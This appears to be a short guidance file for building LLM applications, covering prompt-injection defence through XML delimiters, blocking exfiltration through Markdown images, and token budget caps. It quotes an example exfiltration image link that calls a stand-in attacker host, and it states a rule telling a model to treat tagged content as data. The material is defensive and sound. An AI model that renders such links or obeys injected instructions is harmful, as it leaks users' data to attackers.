# LLM applications: guardrails and cost

Read only for this topic. These are adaptation examples, not a required stack or file structure. Follow the entrypoint's scope and the project's existing framework, tools, and authorization. Do not copy placeholders, add packages, or replace working architecture solely to match an example.

## 6 - Guardrails, Security & Token Economics

- **Prompt Injection Defense**: Wrap untrusted inputs in XML delimiters. Tell the model to treat content inside tags strictly as data, never instructions.
- **Data Exfiltration Defense**: Disallow models from rendering user-controlled Markdown images (`![leak](https://attacker.com/data=...)`) or unverified URLs.
- **Budget Caps**: Always set an explicit `max_tokens` cap on every completion. Monitor total session tokens to prevent denial-of-wallet attacks.

---
